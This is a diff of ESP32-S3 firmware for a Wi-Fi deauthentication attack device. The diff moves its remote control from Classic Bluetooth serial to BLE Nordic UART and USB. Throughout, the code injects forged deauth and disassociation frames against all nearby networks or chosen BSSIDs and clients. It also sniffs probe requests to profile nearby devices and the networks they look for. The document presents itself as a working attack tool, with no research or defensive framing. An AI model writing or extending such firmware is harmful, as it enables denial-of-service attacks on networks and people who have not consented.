@@ -1,12 +1,12 @@
 /*
- * ESP32 Deauth — High-Power Precision + Accurate Client Scan
- * Bluetooth Serial control
+ * ESP32-S3 Deauth — High-Power + Client Scan + BLE Control
+ * Control: USB Serial (CDC) AND BLE Nordic UART Service
  *
- * New:
- *   SCANSTA [seconds]  — focused client discovery (default 8s)
- *   Clients get vendor name from OUI + probe SSID when available
+ * Phone: nRF Connect / Serial Bluetooth Terminal (BLE mode)
+ *   Connect to "ESP32-DEAUTH"
+ *   Use Nordic UART RX/TX characteristics
  *
- * Commands:
+ * Commands (newline terminated, USB or BLE):
  *   SCAN | SCANSTA [sec]
  *   ATTACK ALL | ATTACK <BSSID>
  *   STA <MAC>
@@ -15,13 +15,13 @@
  *   REASON <code> | MODE DEAUTH|DISASSOC|BOTH
  *   HELP
  *
- * Pair: ESP32-DEAUTH  (Serial Bluetooth Terminal)
+ * Requires: NimBLE-Arduino (h2zero) — Library Manager or
+ *   platformio: h2zero/NimBLE-Arduino
  */
 
 #include <WiFi.h>
 #include <esp_wifi.h>
-#include <BluetoothSerial.h>
-#include <esp_bt.h>
+#include <NimBLEDevice.h>
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
 #include <freertos/semphr.h>
@@ -35,12 +35,17 @@
 #define MAX_RATE          128
 #define SCAN_DWELL_MS     100
 #define SCANSTA_DEFAULT_S 8
-#define BT_NAME           "ESP32-DEAUTH"
 #define HOP_MS            45
 #define DEFAULT_REASON    0x07
 #define TX_POWER_MAX      78
 #define DEAUTH_TASK_STACK 6144
 #define HOP_TASK_STACK    2048
+#define BT_NAME           "ESP32-DEAUTH"
+
+// Nordic UART Service UUIDs
+#define NUS_SERVICE_UUID  "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
+#define NUS_RX_UUID       "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"  // phone → ESP
+#define NUS_TX_UUID       "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"  // ESP → phone
 
 struct APInfo {
   uint8_t  bssid[6];
@@ -55,12 +60,10 @@ struct ClientInfo {
   uint8_t  ap_bssid[6];
   int8_t   rssi;
   uint8_t  channel;
-  char     name[24];   // vendor or probe SSID
+  char     name[24];
   bool     active;
-  uint16_t frames;     // how many times seen
+  uint16_t frames;
 };
-
-BluetoothSerial SerialBT;
 
 APInfo     aps[MAX_APS];
 ClientInfo clients[MAX_CLIENTS];
@@ -99,56 +102,38 @@ static uint8_t frame_disassoc[26] = {
   0x00, 0x00, DEFAULT_REASON, 0x00
 };
 
-// Minimal OUI → short vendor name (common clients)
+// ---------- BLE NUS ----------
+static NimBLEServer         *pServer   = nullptr;
+static NimBLECharacteristic *pTxChar   = nullptr;
+static NimBLECharacteristic *pRxChar   = nullptr;
+static bool                  ble_connected = false;
+static char                  ble_line[128];
+static uint8_t               ble_line_idx = 0;
+
 struct OuiEntry { uint8_t o[3]; const char *name; };
 static const OuiEntry oui_table[] = {
-  {{0x3C,0x22,0xFB}, "Apple"},
-  {{0xF0,0xD1,0xA9}, "Apple"},
-  {{0xA4,0x83,0xE7}, "Apple"},
-  {{0xDC,0xA9,0x04}, "Apple"},
-  {{0xF4,0x5C,0x89}, "Apple"},
-  {{0x28,0x37,0x37}, "Apple"},
-  {{0xAC,0xBC,0x32}, "Apple"},
-  {{0x00,0x1A,0x11}, "Google"},
-  {{0x3C,0x5A,0xB4}, "Google"},
-  {{0x54,0x60,0x09}, "Google"},
-  {{0xF4,0xF5,0xE8}, "Google"},
-  {{0x94,0xEB,0x2C}, "Google"},
-  {{0x78,0xF8,0x82}, "Xiaomi"},
-  {{0x28,0x6C,0x07}, "Xiaomi"},
-  {{0x64,0xCC,0x2E}, "Xiaomi"},
-  {{0x50,0x64,0x2B}, "Xiaomi"},
-  {{0x34,0xCE,0x00}, "Xiaomi"},
-  {{0xFC,0x64,0xBA}, "Xiaomi"},
-  {{0xA0,0x86,0xC6}, "Xiaomi"},
-  {{0x00,0x1D,0x0F}, "Samsung"},
-  {{0x5C,0x0A,0x5B}, "Samsung"},
-  {{0x8C,0x71,0xF8}, "Samsung"},
-  {{0xC8,0xBA,0x94}, "Samsung"},
-  {{0xF0,0xEE,0x7A}, "Samsung"},
-  {{0x00,0x16,0x6C}, "Samsung"},
-  {{0xAC,0x5A,0x14}, "Samsung"},
-  {{0xB8,0x27,0xEB}, "RPi"},
-  {{0xDC,0xA6,0x32}, "RPi"},
-  {{0xE4,0x5F,0x01}, "RPi"},
-  {{0x28,0xCD,0xC1}, "RPi"},
-  {{0x00,0x50,0xF2}, "Microsoft"},
-  {{0x00,0x15,0x5D}, "Microsoft"},
-  {{0x7C,0x1E,0x52}, "Microsoft"},
-  {{0x00,0x0C,0x29}, "VMware"},
-  {{0x00,0x50,0x56}, "VMware"},
-  {{0x08,0x00,0x27}, "VirtualBox"},
-  {{0x52,0x54,0x00}, "QEMU"},
-  {{0x00,0x1E,0xC2}, "Cisco"},
-  {{0x00,0x26,0x0A}, "Cisco"},
-  {{0xF8,0x66,0xF2}, "Cisco"},
-  {{0x00,0x14,0x22}, "Dell"},
-  {{0xD4,0xBE,0xD9}, "Dell"},
-  {{0x18,0x66,0xDA}, "Dell"},
-  {{0x00,0x1A,0x2B}, "Ayecom"},
-  {{0x00,0xE0,0x4C}, "Realtek"},
-  {{0x00,0xE0,0x4D}, "Realtek"},
-  {{0x52,0x54,0x00}, "Virt"},
+  {{0x3C,0x22,0xFB}, "Apple"}, {{0xF0,0xD1,0xA9}, "Apple"},
+  {{0xA4,0x83,0xE7}, "Apple"}, {{0xDC,0xA9,0x04}, "Apple"},
+  {{0xF4,0x5C,0x89}, "Apple"}, {{0x28,0x37,0x37}, "Apple"},
+  {{0xAC,0xBC,0x32}, "Apple"}, {{0x00,0x1A,0x11}, "Google"},
+  {{0x3C,0x5A,0xB4}, "Google"}, {{0x54,0x60,0x09}, "Google"},
+  {{0xF4,0xF5,0xE8}, "Google"}, {{0x94,0xEB,0x2C}, "Google"},
+  {{0x78,0xF8,0x82}, "Xiaomi"}, {{0x28,0x6C,0x07}, "Xiaomi"},
+  {{0x64,0xCC,0x2E}, "Xiaomi"}, {{0x50,0x64,0x2B}, "Xiaomi"},
+  {{0x34,0xCE,0x00}, "Xiaomi"}, {{0xFC,0x64,0xBA}, "Xiaomi"},
+  {{0xA0,0x86,0xC6}, "Xiaomi"}, {{0x00,0x1D,0x0F}, "Samsung"},
+  {{0x5C,0x0A,0x5B}, "Samsung"}, {{0x8C,0x71,0xF8}, "Samsung"},
+  {{0xC8,0xBA,0x94}, "Samsung"}, {{0xF0,0xEE,0x7A}, "Samsung"},
+  {{0x00,0x16,0x6C}, "Samsung"}, {{0xAC,0x5A,0x14}, "Samsung"},
+  {{0xB8,0x27,0xEB}, "RPi"}, {{0xDC,0xA6,0x32}, "RPi"},
+  {{0xE4,0x5F,0x01}, "RPi"}, {{0x28,0xCD,0xC1}, "RPi"},
+  {{0x00,0x50,0xF2}, "Microsoft"}, {{0x00,0x15,0x5D}, "Microsoft"},
+  {{0x7C,0x1E,0x52}, "Microsoft"}, {{0x00,0x0C,0x29}, "VMware"},
+  {{0x00,0x50,0x56}, "VMware"}, {{0x08,0x00,0x27}, "VirtualBox"},
+  {{0x00,0x1E,0xC2}, "Cisco"}, {{0x00,0x26,0x0A}, "Cisco"},
+  {{0xF8,0x66,0xF2}, "Cisco"}, {{0x00,0x14,0x22}, "Dell"},
+  {{0xD4,0xBE,0xD9}, "Dell"}, {{0x18,0x66,0xDA}, "Dell"},
+  {{0x00,0xE0,0x4C}, "Realtek"}, {{0x00,0xE0,0x4D}, "Realtek"},
 };
 static const int oui_count = sizeof(oui_table) / sizeof(oui_table[0]);
 
@@ -162,7 +147,6 @@ static void lookup_vendor(const uint8_t *mac, char *out, size_t outlen) {
       return;
     }
   }
-  // fallback: short OUI hex
   snprintf(out, outlen, "%02X%02X%02X", mac[0], mac[1], mac[2]);
 }
 
@@ -180,21 +164,92 @@ static bool parse_mac(const char *str, uint8_t *out) {
   return true;
 }
 
-static void bt_print(const char *msg) {
-  SerialBT.println(msg);
+// Output to USB + BLE TX
+static void out_print(const char *msg) {
   Serial.println(msg);
+  if (ble_connected && pTxChar) {
+    pTxChar->setValue((uint8_t *)msg, strlen(msg));
+    pTxChar->notify();
+    // also send \n for terminals that expect it
+    const char nl[] = "\n";
+    pTxChar->setValue((uint8_t *)nl, 1);
+    pTxChar->notify();
+  }
 }
 
-static void bt_printf(const char *fmt, ...) {
+static void out_printf(const char *fmt, ...) {
   char buf[220];
   va_list args;
   va_start(args, fmt);
   vsnprintf(buf, sizeof(buf), fmt, args);
   va_end(args);
-  SerialBT.println(buf);
-  Serial.println(buf);
+  out_print(buf);
 }
 
+// ---------- BLE callbacks ----------
+class ServerCallbacks : public NimBLEServerCallbacks {
+  void onConnect(NimBLEServer *s, NimBLEConnInfo &connInfo) override {
+    ble_connected = true;
+    Serial.println("[BLE] connected");
+  }
+  void onDisconnect(NimBLEServer *s, NimBLEConnInfo &connInfo, int reason) override {
+    ble_connected = false;
+    Serial.println("[BLE] disconnected");
+    NimBLEDevice::startAdvertising();
+  }
+};
+
+class RxCallbacks : public NimBLECharacteristicCallbacks {
+  void onWrite(NimBLECharacteristic *c, NimBLEConnInfo &connInfo) override {
+    std::string val = c->getValue();
+    for (size_t i = 0; i < val.length(); i++) {
+      char ch = val[i];
+      if (ch == '\n' || ch == '\r') {
+        if (ble_line_idx > 0) {
+          ble_line[ble_line_idx] = '\0';
+          // defer to main loop via flag — process immediately is fine
+          extern void handle_cmd(char *line);
+          handle_cmd(ble_line);
+          ble_line_idx = 0;
+        }
+      } else if (ble_line_idx < sizeof(ble_line) - 1) {
+        ble_line[ble_line_idx++] = ch;
+      }
+    }
+  }
+};
+
+static void setup_ble() {
+  NimBLEDevice::init(BT_NAME);
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // max BLE TX
+
+  pServer = NimBLEDevice::createServer();
+  pServer->setCallbacks(new ServerCallbacks());
+
+  NimBLEService *pService = pServer->createService(NUS_SERVICE_UUID);
+
+  pTxChar = pService->createCharacteristic(
+    NUS_TX_UUID,
+    NIMBLE_PROPERTY::NOTIFY | NIMBLE_PROPERTY::READ
+  );
+
+  pRxChar = pService->createCharacteristic(
+    NUS_RX_UUID,
+    NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR
+  );
+  pRxChar->setCallbacks(new RxCallbacks());
+
+  pService->start();
+
+  NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
+  pAdv->addServiceUUID(NUS_SERVICE_UUID);
+  pAdv->setName(BT_NAME);
+  pAdv->start();
+
+  Serial.println("[BLE] advertising as " BT_NAME);
+}
+
+// ---------- TX inject ----------
 static IRAM_ATTR void inject_pair(const uint8_t *bssid, const uint8_t *dst) {
   frame_deauth[24]   = reason_code;
   frame_disassoc[24] = reason_code;
@@ -232,7 +287,6 @@ static IRAM_ATTR void inject_pair(const uint8_t *bssid, const uint8_t *dst) {
   }
 }
 
-// Extract SSID from tagged parameters (probe req / beacon)
 static void extract_ssid(const uint8_t *tags, int remaining, char *out, size_t outlen) {
   out[0] = '\0';
   while (remaining > 2) {
@@ -261,7 +315,6 @@ static void IRAM_ATTR sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
   int8_t  rssi = pkt->rx_ctrl.rssi;
   uint8_t ch   = pkt->rx_ctrl.channel;
 
-  // ----- Beacon / Probe Response → AP -----
   if (frame_type == 0x00 && (frame_sub == 8 || frame_sub == 5)) {
     if (xSemaphoreTake(ap_mutex, 0) != pdTRUE) return;
     const uint8_t *bssid = &payload[16];
@@ -285,9 +338,8 @@ static void IRAM_ATTR sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     return;
   }
 
-  // ----- Probe Request (subtype 4) → client + optional SSID name -----
   if (frame_type == 0x00 && frame_sub == 4) {
-    const uint8_t *sa = &payload[10];   // source = client
+    const uint8_t *sa = &payload[10];
     if (sa[0] & 0x01) return;
     if (xSemaphoreTake(ap_mutex, 0) != pdTRUE) return;
 
@@ -308,21 +360,17 @@ static void IRAM_ATTR sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
       clients[cidx].channel = ch;
       clients[cidx].active  = true;
       clients[cidx].frames++;
-      // try pull SSID from probe (directed probe)
       if (len > 24) {
         char probe_ssid[33] = {0};
         extract_ssid(&payload[24], len - 24, probe_ssid, sizeof(probe_ssid));
-        if (probe_ssid[0] && strcmp(clients[cidx].name, probe_ssid) != 0) {
-          // prefer probe SSID as name if present (shows what network it's looking for)
+        if (probe_ssid[0])
           snprintf(clients[cidx].name, sizeof(clients[cidx].name), "%.20s", probe_ssid);
-        }
       }
     }
     xSemaphoreGive(ap_mutex);
     return;
   }
 
-  // ----- Data frames → associated client discovery -----
   if (frame_type == 0x08 && len >= 24) {
     const uint8_t *addr1 = &payload[4];
     const uint8_t *addr2 = &payload[10];
@@ -337,9 +385,6 @@ static void IRAM_ATTR sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     } else if (to_ds == 1 && from_ds == 0) {
       sta   = addr2;
       bssid = addr1;
-    } else if (to_ds == 1 && from_ds == 1) {
-      // WDS — skip
-      return;
     }
     if (!sta || !bssid) return;
     if (sta[0] & 0x01) return;
@@ -441,7 +486,7 @@ void deauth_task(void *param) {
 }
 
 void do_scan() {
-  bt_print("[*] SCAN APs + clients (1-13)...");
+  out_print("[*] SCAN APs + clients...");
   bool was = attacking;
   attacking = false;
   vTaskDelay(pdMS_TO_TICKS(40));
@@ -462,36 +507,34 @@ void do_scan() {
   attacking = was;
 
   if (xSemaphoreTake(ap_mutex, pdMS_TO_TICKS(80)) == pdTRUE) {
-    bt_printf("[+] %d APs, %d STAs", ap_count, client_count);
+    out_printf("[+] %d APs, %d STAs", ap_count, client_count);
     for (int i = 0; i < ap_count; i++) {
       char mac[18];
       mac_to_str(aps[i].bssid, mac);
-      bt_printf("  %2d ch:%2d rssi:%4d %s %s",
-                i, aps[i].channel, aps[i].rssi, mac, aps[i].ssid);
+      out_printf("  %2d ch:%2d rssi:%4d %s %s",
+                 i, aps[i].channel, aps[i].rssi, mac, aps[i].ssid);
     }
     for (int i = 0; i < client_count; i++) {
       char sm[18], am[18];
       mac_to_str(clients[i].mac, sm);
       mac_to_str(clients[i].ap_bssid, am);
-      bt_printf("  STA %s [%s] -> %s ch:%d rssi:%d f:%u",
-                sm, clients[i].name, am,
-                clients[i].channel, clients[i].rssi, clients[i].frames);
+      out_printf("  STA %s [%s] -> %s ch:%d rssi:%d f:%u",
+                 sm, clients[i].name, am,
+                 clients[i].channel, clients[i].rssi, clients[i].frames);
     }
     xSemaphoreGive(ap_mutex);
   }
 }
 
-// Focused client scan — longer dwell, all channels, emphasize probe + data
 void do_scansta(int seconds) {
   if (seconds < 2) seconds = 2;
   if (seconds > 30) seconds = 30;
-  bt_printf("[*] SCANSTA %ds — deep client discovery...", seconds);
+  out_printf("[*] SCANSTA %ds...", seconds);
 
   bool was = attacking;
   attacking = false;
   vTaskDelay(pdMS_TO_TICKS(30));
 
-  // keep existing APs, refresh clients
   client_count = 0;
   memset(clients, 0, sizeof(clients));
 
@@ -510,7 +553,7 @@ void do_scansta(int seconds) {
   attacking = was;
 
   if (xSemaphoreTake(ap_mutex, pdMS_TO_TICKS(80)) == pdTRUE) {
-    bt_printf("[+] Clients found: %d", client_count);
+    out_printf("[+] Clients: %d", client_count);
     for (int i = 0; i < client_count; i++) {
       char sm[18], am[18];
       mac_to_str(clients[i].mac, sm);
@@ -519,9 +562,9 @@ void do_scansta(int seconds) {
         mac_to_str(clients[i].ap_bssid, am);
       else
         strcpy(am, "--------");
-      bt_printf("  %2d %s  name:%-12s  AP:%s  ch:%2d  rssi:%4d  frames:%u",
-                i, sm, clients[i].name, am,
-                clients[i].channel, clients[i].rssi, clients[i].frames);
+      out_printf("  %2d %s name:%-12s AP:%s ch:%2d rssi:%4d f:%u",
+                 i, sm, clients[i].name, am,
+                 clients[i].channel, clients[i].rssi, clients[i].frames);
     }
     xSemaphoreGive(ap_mutex);
   }
@@ -555,11 +598,11 @@ void handle_cmd(char *line) {
       attacking  = true;
       packets_sent = 0;
       locked_channel = 0;
-      bt_print("[!] ATTACK ALL");
+      out_print("[!] ATTACK ALL");
     } else {
       uint8_t mac[6];
       if (!parse_mac(arg, mac)) {
-        bt_print("[-] Bad BSSID");
+        out_print("[-] Bad BSSID");
         return;
       }
       memcpy((void *)target_bssid, mac, 6);
@@ -578,19 +621,19 @@ void handle_cmd(char *line) {
       }
       char m[18];
       mac_to_str(mac, m);
-      bt_printf("[!] ATTACK %s ch=%d", m, locked_channel);
+      out_printf("[!] ATTACK %s ch=%d", m, locked_channel);
     }
   }
   else if (strcmp(cmd, "STA") == 0) {
     uint8_t mac[6];
     if (!parse_mac(arg, mac)) {
-      bt_print("[-] Bad STA MAC");
+      out_print("[-] Bad STA MAC");
       return;
     }
     bool has_ap = false;
     for (int i = 0; i < 6; i++) if (target_bssid[i]) has_ap = true;
     if (!has_ap) {
-      bt_print("[-] ATTACK <BSSID> first, then STA <MAC>");
+      out_print("[-] ATTACK <BSSID> first");
       return;
     }
     memcpy((void *)target_sta, mac, 6);
@@ -600,82 +643,78 @@ void handle_cmd(char *line) {
     packets_sent = 0;
     char m[18];
     mac_to_str(mac, m);
-    bt_printf("[!] UNICAST STA %s", m);
+    out_printf("[!] UNICAST STA %s", m);
   }
   else if (strcmp(cmd, "STOP") == 0) {
     attacking = false;
     unicast_sta = false;
     locked_channel = 0;
-    bt_print("[*] Stopped");
+    out_print("[*] Stopped");
   }
   else if (strcmp(cmd, "STATUS") == 0) {
     const char *mode_str = attack_mode == 0 ? "DEAUTH" :
                            attack_mode == 1 ? "DISASSOC" : "BOTH";
-    bt_printf("[i] att=%d all=%d uni=%d rate=%u reason=%u mode=%s pkts=%lu ch=%d APs=%d STAs=%d",
-              attacking, attack_all, unicast_sta, packet_rate, reason_code,
-              mode_str, (unsigned long)packets_sent, locked_channel,
-              ap_count, client_count);
+    out_printf("[i] att=%d all=%d uni=%d rate=%u reason=%u mode=%s pkts=%lu ch=%d APs=%d STAs=%d",
+               attacking, attack_all, unicast_sta, packet_rate, reason_code,
+               mode_str, (unsigned long)packets_sent, locked_channel,
+               ap_count, client_count);
   }
   else if (strcmp(cmd, "CHANNEL") == 0) {
     int ch = atoi(arg);
     if (ch < 0 || ch > 13) {
-      bt_print("[-] 0-13");
+      out_print("[-] 0-13");
       return;
     }
     locked_channel = (uint8_t)ch;
     if (ch > 0) esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-    bt_printf("[*] Channel = %d", ch);
+    out_printf("[*] Channel = %d", ch);
   }
   else if (strcmp(cmd, "RATE") == 0) {
     int r = atoi(arg);
     if (r < 1) r = 1;
     if (r > MAX_RATE) r = MAX_RATE;
     packet_rate = (uint16_t)r;
-    bt_printf("[*] Rate = %u", packet_rate);
+    out_printf("[*] Rate = %u", packet_rate);
   }
   else if (strcmp(cmd, "REASON") == 0) {
     int r = atoi(arg);
     if (r < 1 || r > 99) r = DEFAULT_REASON;
     reason_code = (uint8_t)r;
-    bt_printf("[*] Reason = %u", reason_code);
+    out_printf("[*] Reason = %u", reason_code);
   }
   else if (strcmp(cmd, "MODE") == 0) {
     for (char *p = arg; *p; p++) *p = toupper(*p);
     if (strcmp(arg, "DEAUTH") == 0) {
       attack_mode = 0;
-      bt_print("[*] Mode = DEAUTH");
+      out_print("[*] Mode = DEAUTH");
     } else if (strcmp(arg, "DISASSOC") == 0) {
       attack_mode = 1;
-      bt_print("[*] Mode = DISASSOC");
+      out_print("[*] Mode = DISASSOC");
     } else if (strcmp(arg, "BOTH") == 0) {
       attack_mode = 2;
-      bt_print("[*] Mode = BOTH");
+      out_print("[*] Mode = BOTH");
     } else {
-      bt_print("[-] MODE DEAUTH|DISASSOC|BOTH");
+      out_print("[-] MODE DEAUTH|DISASSOC|BOTH");
     }
   }
   else if (strcmp(cmd, "HELP") == 0) {
-    bt_print("SCAN          AP + client overview");
-    bt_print("SCANSTA [sec] deep client scan (default 8)");
-    bt_print("ATTACK ALL | ATTACK <BSSID>");
-    bt_print("STA <MAC>     unicast one client");
-    bt_print("STOP | STATUS | CHANNEL | RATE | REASON | MODE");
+    out_print("SCAN | SCANSTA [sec]");
+    out_print("ATTACK ALL | ATTACK <BSSID>");
+    out_print("STA <MAC> | STOP | STATUS");
+    out_print("CHANNEL | RATE | REASON | MODE");
   }
   else {
-    bt_printf("[-] Unknown: %s", cmd);
+    out_printf("[-] Unknown: %s", cmd);
   }
 }
 
 void setup() {
   Serial.begin(115200);
-  delay(150);
+  delay(400);
+
   setCpuFrequencyMhz(240);
 
-  if (!SerialBT.begin(BT_NAME))
-    Serial.println("BT fail");
-  else
-    Serial.println("BT: " BT_NAME);
-
+  // WiFi first
   WiFi.mode(WIFI_MODE_STA);
   WiFi.disconnect(true, true);
   delay(40);
@@ -695,28 +734,20 @@ void setup() {
   xTaskCreatePinnedToCore(channel_hop_task, "hop", HOP_TASK_STACK, NULL, 2,
                           &hop_task_handle, 0);
 
-  bt_print("========================================");
-  bt_print(" ESP32 Deauth + Client Scan + Names");
-  bt_print(" BT: " BT_NAME " | HELP");
-  bt_print("========================================");
+  // BLE after WiFi
+  setup_ble();
+
+  out_print("========================================");
+  out_print(" ESP32-S3 Deauth + BLE + Client Scan");
+  out_print(" USB + BLE: " BT_NAME " | HELP");
+  out_print("========================================");
 }
 
 void loop() {
   static char line[100];
   static uint8_t idx = 0;
 
-  while (SerialBT.available()) {
-    char c = SerialBT.read();
-    if (c == '\n' || c == '\r') {
-      if (idx > 0) {
-        line[idx] = '\0';
-        handle_cmd(line);
-        idx = 0;
-      }
-    } else if (idx < sizeof(line) - 1) {
-      line[idx++] = c;
-    }
-  }
+  // USB Serial
   while (Serial.available()) {
     char c = Serial.read();
     if (c == '\n' || c == '\r') {
@@ -732,8 +763,8 @@ void loop() {
 
   if (attacking && (millis() - last_status_ms > 4000)) {
     last_status_ms = millis();
-    bt_printf("[i] pkts=%lu rate=%u ch=%d",
-              (unsigned long)packets_sent, packet_rate, locked_channel);
+    out_printf("[i] pkts=%lu rate=%u ch=%d",
+               (unsigned long)packets_sent, packet_rate, locked_channel);
   }
   vTaskDelay(pdMS_TO_TICKS(4));
 }
